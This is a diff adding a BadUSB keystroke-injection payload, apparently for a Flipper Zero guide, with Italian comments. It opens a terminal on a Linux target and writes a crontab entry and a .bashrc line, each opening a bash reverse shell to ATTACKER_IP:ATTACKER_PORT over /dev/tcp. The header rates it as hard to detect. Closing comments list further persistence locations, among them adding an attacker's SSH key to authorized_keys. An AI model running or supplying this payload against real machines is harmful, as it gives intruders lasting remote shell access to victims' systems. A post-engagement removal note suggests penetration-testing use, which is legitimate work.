@@ -1,0 +1,37 @@
+REM ============================================================
+REM Title:    Linux Persistence via Crontab + Bashrc
+REM Target:   Linux (qualsiasi distro)
+REM Author:   FlipperZero-guide
+REM Category: Persistence
+REM Privs:    User (no root)
+REM Layout:   US
+REM Time:     ~6 secondi
+REM Detect:   Basso - crontab e bashrc sono file utente normali
+REM Desc:     Aggiunge persistence doppia: crontab (ogni 30 min)
+REM           + bashrc (ad ogni apertura terminale).
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+CTRL ALT t
+DELAY 1500
+
+STRING (crontab -l 2>/dev/null; echo "*/30 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'") | crontab - && echo 'nohup bash -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1" &>/dev/null &' >> ~/.bashrc
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
+REM ============================================================
+REM Rimozione post-engagement:
+REM   crontab -e  (rimuovi la riga aggiunta)
+REM   nano ~/.bashrc  (rimuovi l'ultima riga)
+REM
+REM Alternative di persistence Linux:
+REM - ~/.profile (eseguito al login)
+REM - ~/.config/autostart/*.desktop (desktop environment)
+REM - systemd user service (~/.config/systemd/user/)
+REM - /etc/rc.local (richiede root)
+REM - Authorized_keys (aggiungi la TUA chiave SSH pubblica):
+REM   echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys
+REM ============================================================
